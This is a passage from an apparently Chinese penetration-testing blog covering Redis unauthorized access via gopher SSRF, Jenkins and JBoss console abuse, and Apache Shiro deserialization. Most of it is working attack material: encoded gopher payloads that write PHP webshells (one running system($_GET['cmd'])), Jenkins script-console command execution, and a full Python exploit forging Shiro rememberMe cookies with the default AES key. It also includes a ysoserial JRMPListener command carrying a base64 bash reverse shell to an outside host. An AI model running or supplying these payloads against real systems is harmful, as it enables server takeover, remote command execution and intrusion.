4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。</p><p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。</p><p>然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p><h6 id="redis与gopger协议"><a href="#redis与gopger协议" class="headerlink" title="redis与gopger协议"></a>redis与gopger协议</h6><ul><li><p>gopher协议</p><p>gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，gopher是Internet上最主要的信息检索工具，gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p></li><li><p>gopher协议支持发出GET、POST请求</p><p>gopher协议格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure><ul><li><p>gopher发送请求HTTP POST请求</p><p>POST与GET传参的区别：它有4个参数为必要参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@steady:~# curl gopher:&#x2F;&#x2F;172.20.10.3:8888&#x2F;_POST%20&#x2F;tes&#x2F;post.php%20HTTP&#x2F;1.1%0d%0AHost:172.20.10.3%0d%0AContent-Type:application&#x2F;x-www-form-urlencoded%0d%0AContent-Length:12%0d%0A%0d%0Aname&#x3D;purplet%0d%0A</span><br><span class="line">HTTP&#x2F;1.1 404 Not Found</span><br><span class="line">Date: Sun, 20 Sep 2020 09:04:49 GMT</span><br><span class="line">Server: Apache</span><br><span class="line">Content-Length: 210</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;iso-8859-1</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;IETF&#x2F;&#x2F;DTD HTML 2.0&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;404 Not Found&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;The requested URL &#x2F;tes&#x2F;post.php was not found on this server.&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>gopher发送请求HTTP GET请求</p><p>mac监听端口，kali尝试使用gopger发起get请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@steady:~# curl gopher:&#x2F;&#x2F;172.20.10.3:1234&#x2F;_abcd</span><br></pre></td></tr></table></figure><p>注意：steady是要传递的数据，_会被吃掉不会传递过去。</p><p>mac查看是否收到GET请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ncat -lnvp 1234</span><br><span class="line">abcd</span><br></pre></td></tr></table></figure><p>注意：abcd是要传递的数据，_会被吃掉不会传递过去。</p></li><li><p>gopher发送原始的请求包</p><p>gopher发送原始的http请求包</p><p>在gopher协议中发送HTTP的数据，需要以下三步：</p><p>1、构造HTTP数据包 </p><p>2、URL编码、替换回车换行为%0d%0a </p><p>3、发送gopher协议</p><p>新建php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.$_GET[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;\n&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1、问号（？）需要转码为URL编码，也就是%3f</p><p>2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</p><p>3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</p><p>4.、gopher协议后的IP一定要接端口</p><p>在mac上新建一个php文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    echo &quot;Hello &quot;.$_GET[&quot;name&quot;].&quot;\n&quot;?&gt;</span><br></pre></td></tr></table></figure><p>正常浏览器访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.20.10.3:8888&#x2F;1.php?name&#x3D;11</span><br></pre></td></tr></table></figure><p>使用gopher协议访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@steady:~# curl gopher:&#x2F;&#x2F;172.20.10.3:8888&#x2F;_GET%20&#x2F;1.php?name&#x3D;11%20HTTP&#x2F;1.1%0d%0aHost:%20172.20.10.3%0d%0a</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Sun, 20 Sep 2020 09:10:18 GMT</span><br><span class="line">Server: Apache</span><br><span class="line">X-Powered-By: PHP&#x2F;5.6.40</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line"></span><br><span class="line">9</span><br><span class="line">Hello 11</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure></li></ul></li><li><p>利用gopher协议向redis写shell</p><p>常见场景：</p><ul><li>1、目标redis公网不能直接访问。</li><li>2、能够利用ssrf漏洞</li></ul><p>mac生成poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python &#x2F;Users&#x2F;apple&#x2F;Downloads&#x2F;sec_tools-master&#x2F;redis-over-gopher&#x2F;redis-over-gopher.py</span><br><span class="line">gopher:&#x2F;&#x2F;172.20.10.10:6379&#x2F;_%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%33%0d%0a%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%39%0d%0a%73%68%65%6c%6c%2e%70%68%70%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%38%0d%0a%77%65%62%73%68%65%6c%6c%0d%0a%24%31%38%0d%0a%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%3f%3e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a</span><br></pre></td></tr></table></figure><p>尝试使用gopger协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl gopher:&#x2F;&#x2F;172.20.10.10:6379&#x2F;_%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%33%0d%0a%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%39%0d%0a%73%68%65%6c%6c%2e%70%68%70%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%38%0d%0a%77%65%62%73%68%65%6c%6c%0d%0a%24%31%38%0d%0a%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%3f%3e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br></pre></td></tr></table></figure><p>成功写入webshell。</p><p>使用gopherus</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">➜  Gopherus python gopherus.py --exploit redis</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ________              .__</span><br><span class="line"> &#x2F;  _____&#x2F;  ____ ______ |  |__   ___________ __ __  ______</span><br><span class="line">&#x2F;   \  ___ &#x2F;  _ \\____ \|  |  \_&#x2F; __ \_  __ \  |  \&#x2F;  ___&#x2F;</span><br><span class="line">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___&#x2F;|  | \&#x2F;  |  &#x2F;\___ \</span><br><span class="line"> \______  &#x2F;\____&#x2F;|   __&#x2F;|___|  &#x2F;\___  &gt;__|  |____&#x2F;&#x2F;____  &gt;</span><br><span class="line">        \&#x2F;       |__|        \&#x2F;     \&#x2F;                 \&#x2F;</span><br><span class="line"></span><br><span class="line">author: $_SpyD3r_$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ready To get SHELL</span><br><span class="line"></span><br><span class="line">What do you want?? (ReverseShell&#x2F;PHPShell): PHPSHELL</span><br><span class="line"></span><br><span class="line">Give web root location of server (default is &#x2F;var&#x2F;www&#x2F;html):</span><br><span class="line">Give PHP Payload (We have default PHP Shell):</span><br><span class="line"></span><br><span class="line">Your gopher link is Ready to get PHP Shell:</span><br><span class="line"></span><br><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br><span class="line"></span><br><span class="line">When it&#39;s done you can get PHP Shell in &#x2F;shell.php at the server with &#96;cmd&#96; as parmeter.</span><br><span class="line"></span><br><span class="line">-----------Made-by-SpyD3r-----------</span><br></pre></td></tr></table></figure></li></ul><h5 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h5><h6 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h6><ul><li>Windows的启动项和计划任务并不是以文本形式保存在固定位置的</li><li>Windows的Redis最新版本还停留在3.2，不可以利用主从漏洞getshell。</li></ul><h6 id="redis未授权访问漏洞利用与防御-1"><a href="#redis未授权访问漏洞利用与防御-1" class="headerlink" title="redis未授权访问漏洞利用与防御"></a>redis未授权访问漏洞利用与防御</h6><ul><li><p>有web环境</p><p>利用<code>RedisWriteFile</code>文件写入shell，脚本将自己模拟为master，设置对端为slave。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python RedisWriteFile.py --rhost&#x3D;[target_ip] --rport&#x3D;[target_redis_port] --lhost&#x3D;[evil_master_host] --lport&#x3D;[random] --rpath&#x3D;&quot;[path_to_write]&quot; --rfile&#x3D;&quot;[filename]&quot; --lfile&#x3D;[filename]</span><br></pre></td></tr></table></figure></li><li><p>无web环境</p><ul><li><p>启动项</p><p>系统服务、计划任务、注册表启动项、用户的startup目录，前三种是无法通过单纯向某目录中写文件实现精准篡改的，因此只有startup目录可以利用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><p>利用条件：</p><p>管理员将Redis添加了服务项并配了一个高权限（如Administrator甚至SYSTEM），并且主机重启才可以生效。</p></li><li><p>mof</p><p>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：<code>C:/windows/system32/wbem/mof/nullevt.mof</code>，其作用是每隔五秒就会去监控进程创建和死亡。</p><p>利用条件：</p><p>默认5秒执行一次的设定只有03及以下系统才会有</p></li><li><p>修改dll等。</p></li></ul></li></ul><h3 id="8080端口–Jenkins"><a href="#8080端口–Jenkins" class="headerlink" title="8080端口–Jenkins"></a>8080端口–Jenkins</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>默认情况下 Jenkins 面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>访问<code>http://xxxxx:8080/</code></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201124144533536.png" alt="image-20201124144533536"></p><p>但并不能证明是未授权访问，我们需要访问<code>xxxxx:8080/manage</code>，来验证是否成功。如果可以直接访问则表示未授权，否则直接跳转<code>http://xxxxx:8080/login?from=%2Fmanage</code>。</p><h5 id="未授权访问写shell"><a href="#未授权访问写shell" class="headerlink" title="未授权访问写shell"></a>未授权访问写shell</h5><p>直接访问脚本命令行</p><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println &quot;whoami&quot;.execute().text</span><br></pre></td></tr></table></figure><p>写入文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new File (&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&quot;).write(&#39;&lt;?php phpinfo(); ?&gt;&#39;);</span><br></pre></td></tr></table></figure><h3 id="jboss-未授权访问"><a href="#jboss-未授权访问" class="headerlink" title="jboss 未授权访问"></a>jboss 未授权访问</h3><h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>未授权访问管理控制台,通过该漏洞,可以后台管理服务,可以通过脚本命令执行系统命令,如反弹shell,wget写webshell文件。若是无需认证直接进入<code>jmx-console</code>控制页面的话,则有可能存在该漏洞。</p><h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>使用apache搭建远程木马服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  jsp马 jar -cvfM0 ma.war 1.jsp</span><br><span class="line">正在添加: 1.jsp(输入 &#x3D; 85033) (输出 &#x3D; 85033)(存储了 0%)</span><br></pre></td></tr></table></figure><p>点击<code>jboss.deployment</code>进入应用部署页面通过<code>addurl</code>参数进行木马的远程部署</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201127142612543.png" alt="image-20201127142612543"></p><p>访问木马地址<code>http://&lt;ip&gt;/shell.war</code>。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro安全</title>
      <link href="2020/03/27/Apache_Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/03/27/Apache_Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiro安全"><a href="#Shiro安全" class="headerlink" title="Shiro安全"></a>Shiro安全</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Apache Shiro 是一个强大灵活的开源安全框架，可以完全处理身份验证、授权、加密和会话管理。</p><h2 id="Shiro的功能"><a href="#Shiro的功能" class="headerlink" title="Shiro的功能"></a>Shiro的功能</h2><ul><li>验证用户身份</li><li>用户访问权限控制，比如：1、判断用户是否分配了一定的安全角色。2、判断用户是否被授予完成某个操作的权限</li><li>在非 Web 或 EJB 容器的环境下可以任意使用Session API</li><li>可以响应认证、访问控制，或者 Session 生命周期中发生的事件</li><li>可将一个或以上用户安全数据源数据组合成一个复合的用户 “view”(视图)</li><li>支持单点登录(SSO)功能</li><li>支持提供“Remember Me”服务，获取用户关联信息而无需登录</li></ul><h1 id="Apache-Shiro-反序列化漏洞实战"><a href="#Apache-Shiro-反序列化漏洞实战" class="headerlink" title="Apache Shiro 反序列化漏洞实战"></a>Apache Shiro 反序列化漏洞实战</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。实际上漏洞与shiro版本无关, 无论是否升级shiro到1.2.5及以上, 如果shiro的rememberMe功能的AES密钥被泄露, 就会导致反序列化漏洞。</p><h3 id="RememberMe"><a href="#RememberMe" class="headerlink" title="RememberMe"></a>RememberMe</h3><p>1、检索RememberMe cookie 的值<br>2、Base 64解码<br>3、使用AES解密(加密密钥硬编码)<br>4、进行反序列化操作（未作过滤处理）</p><p>在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。</p><p>用户登录凭证的生成，加密顺序：</p><p>Java序列化 —&gt; 使用密钥进行AES加密 —&gt; Base64加密 —&gt; 加密后的remember Me内容</p><p>在识别用户身份的时候，需要对remember Me的字段进行解密，解密的顺序为：</p><p> remember Me加密内容 —&gt; Base64解密 —&gt; 使用密钥进行AES解密 —&gt;Java反序列化。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>由于使用来aes加密，要想成功利用漏洞则需要获取aes的加密密钥，而在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为kPH+bIxk5D2deZiIxcaaaA==。这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞。</p><p>1、AES加密是硬编码。</p><p>2、反序列化没有做任何过滤，外界传递什么值就反序列化什么值。</p><h3 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h3><p>如果登录页面有记住我的功能，登录页面的cookie中存在remeberMe=deleteMe的内容。</p><ul><li><p>使用burp测试</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/136A6698-B0F0-40A5-8222-A4778FDC93C6.png" alt="136A6698-B0F0-40A5-8222-A4778FDC93C6"></p><p>输入密码之后返回包中看到敏感字段</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200909161300847.png" alt="image-20200909161300847"></p></li><li><p>直接浏览器查看请求</p></li><li><p>fofa、shodan、zoomeye</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header&#x3D;&quot;rememberme&#x3D;deleteMe&quot;、header&#x3D;&quot;shiroCookie&quot;</span><br></pre></td></tr></table></figure></li></ul><h3 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h3><p>ysoserial是一款目前最流行的Java反序列化Payload生成工具，目前支持29种的Payload生成。本地通过JRMPClient的payload链接服务器上的JRMP服务使用网上的漏洞利用工具发送即可利用成功。</p><h4 id="RMI简介"><a href="#RMI简介" class="headerlink" title="RMI简介"></a>RMI简介</h4><p>Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p><h4 id="RMI的序列化和反序列化"><a href="#RMI的序列化和反序列化" class="headerlink" title="RMI的序列化和反序列化"></a>RMI的序列化和反序列化</h4><p>在RMI的通信过程中，用到了很多的序列化和反序列化，而在Java中，只要进行反序列化操作就可能有漏洞。RMI通过序列化传输Remote对象，那么我们可以构造恶意的Remote对象，当服务端反序列化传输过来的数据时，就会触发反序列化。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://127.0.0.1:8080/doLogin&quot;</span></span><br><span class="line">jar_file = <span class="string">&#x27;/Users/apple/Documents/steady-sec/shiro/ysoserial.jar&#x27;</span></span><br><span class="line">cipher_key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 rememberme的值</span></span><br><span class="line">popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,jar_file, <span class="string">&quot;URLDNS&quot;</span>, <span class="string">&quot;http://95d950.dnslog.cn&quot;</span>],</span><br><span class="line">                        stdout=subprocess.PIPE)</span><br><span class="line">BS = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">iv = uuid.uuid4().bytes</span><br><span class="line">encryptor = AES.new(base64.b64decode(cipher_key), mode, iv)</span><br><span class="line">file_body = pad(popen.stdout.read())</span><br><span class="line">base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送request</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>:base64_ciphertext.decode()&#125;, timeout=<span class="number">30</span>)</span><br><span class="line">    print(r.status_code)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    traceback.print_exc()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">95</span>d950.dnslog.cn<span class="number">112.25</span><span class="number">.12</span><span class="number">.136</span><span class="number">2020</span><span class="number">-10</span><span class="number">-10</span> <span class="number">10</span>:<span class="number">07</span>:<span class="number">12</span></span><br></pre></td></tr></table></figure><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>检查key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py -u http:&#x2F;&#x2F;127.0.0.1:8080</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">try CipherKey :5aaC5qKm5oqA5pyvAAAAAA&#x3D;&#x3D;</span><br><span class="line">generator payload done.</span><br><span class="line">send payload ok.</span><br><span class="line">checking.....</span><br><span class="line">checking.....</span><br><span class="line">checking.....</span><br><span class="line">checking.....</span><br><span class="line">try CipherKey :kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br><span class="line">generator payload done.</span><br><span class="line">send payload ok.</span><br><span class="line">checking.....</span><br><span class="line"></span><br><span class="line">vulnerable:True url:http:&#x2F;&#x2F;127.0.0.1:8080CipherKey:kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>检查gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py -u http:&#x2F;&#x2F;127.0.0.1:8080 -t 3 -p &quot;ping -c 2 http:&#x2F;&#x2F;ax18gp.dnslog.cn&quot; -k &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br></pre></td></tr></table></figure><p>监听本地端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure><p>通过ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令。</p><p>Java base64编码<code>http://www.jackson-t.ca/runtime-exec-payloads.html</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br></pre></td></tr></table></figure><p>CommonsCollections4、CommonsCollections2、CommonsCollections5都可以试试。</p><p>使用shiro.py 生成Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  shiro python shiro_poc_rember.py 127.0.0.1:6666</span><br><span class="line">rememberMe&#x3D;7sf6Aww8S9KEd7uQj2cX60H5BuTt8lt4IoELDzh2pXjkZENeSYWA7WNywqixdac4AY&#x2F;gNom7n+T0AfMgWvjob0njwuaOy4J3tl85oO0uUI+PUQ7IP9w3WYBtn50rRlIkckOfE8e64ps0528OCA6rSU2BkPbOvjpHgAPx8vzopDSGO85t03fBpX8nwzgR8QQyJ&#x2F;R&#x2F;6O7W85RTTxLyGLy9mYwoxYlHScecW&#x2F;jg&#x2F;fgDczxWIooKVKJPLiuCGozp7VddvPmUxrXV5YkzdYCTSXl6087aqul1yAbp0s1bGhVDLCdnwAeZgstLJFKrm2RauJEiM5gz5tkjlBmDZbWqXepaAybgFOgX2ya8xTFM5gN7XIgx8l8Mq2AtvC5gbg3oS1xtofOErw1Xx3kFEdow8AcvzQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 